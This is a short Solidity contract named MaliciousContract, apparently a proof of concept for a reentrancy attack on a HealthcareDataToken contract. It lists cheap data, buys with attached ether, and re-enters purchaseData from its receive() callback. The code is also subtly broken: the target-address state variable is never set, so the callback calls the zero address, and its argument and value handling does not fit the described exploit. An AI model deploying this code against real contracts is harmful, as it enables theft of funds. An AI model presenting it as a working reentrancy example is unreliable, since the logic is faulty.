// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./HealthcareDataToken.sol";
contract MaliciousContract {
    // Declare _healthCareDataTokenContract as a state variable
    address public _healthCareDataTokenContract;

    // This function will be called to perform the reentrant attack
    function attack(address _patient, address _healthCareDataTokenContractAddress) external payable {
        // Set the data for sale with a very low price to ensure the malicious contract can afford it
        HealthcareDataToken(_healthCareDataTokenContractAddress).addHealthData("maliciousData", 1 wei,  block.timestamp + 3600);

        // Initiate the purchaseData function in the target contract
        HealthcareDataToken(_healthCareDataTokenContractAddress).purchaseData{value: msg.value}(_patient);

        // The purchaseData function in the target contract will call back into this malicious contract
        // and the attack function will be reentrant
    }

    // Callback function that will be called during the reentrant attack
    receive() external payable {
        // Perform additional actions during the reentrant attack if needed
        // For example, initiating another purchaseData to further exploit the vulnerability
        HealthcareDataToken(_healthCareDataTokenContract).purchaseData{value: msg.value}(msg.sender);
    }
}
